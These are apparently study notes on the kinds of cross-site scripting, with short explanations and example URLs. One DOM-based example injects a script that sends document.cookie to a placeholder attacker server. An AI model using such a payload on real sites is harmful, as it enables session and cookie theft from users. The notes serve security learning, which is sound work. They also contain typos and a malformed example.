### Types of XSS

* XSS happens when scripts run on a victim's browser when a website cant tell the difference betweene user input and website code.
* **Stored XSS** - When user input is stored on a server and retrieved later unsafely.
    * Although they weren't properly sanitized being injected, scripts could be escaped/sanitized if it was being retrieved 
    * Most dangerous type of XSS
    * <script> alert('XSS by Vickie'); </script>
    * Cookies and personal info could be stolen with XSS. But it can also change site contents and redirect to other sites.
 * **Blind XSS** - a stored XSS that takes place someplace else in the application.
    * Harder to detect, you cant find them by lookinh got reflected input from the server.
    * Attacks can host their own server and if they see a response to that server, then that web application has that XSS vulnerability.
 * **Reflected XSS** - user input is returned without being stored in a database. Often found in input forms that build pages, like search boxes.
     * h<span>ttps://example.com/search?q=<script> ... </script>
     * Not only could they extract data, but **perform malicious actions on the victim's machine on behalf of the attacker**.
 * **DOM-based XSS** - similar to a reflected XSS except it doesnt leave the browser. Scripts injected stay on the browser and targets the DOM of a web page.
     * DOM specifies how HTML creates a webpage and how scripts modify it.
     * Targets local files saved on the browser.
     * jQuery alters the DOM is often vulnerable to these type of attacks.
     * Can be embedded in fragments and URL parameters:
         * h<span>ttps://example.com#about_us
         * h<span>ttps://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script>
  * **Self-XSS** - a social engineering attack that tricks users into executing a XSS intructed by the attacker.
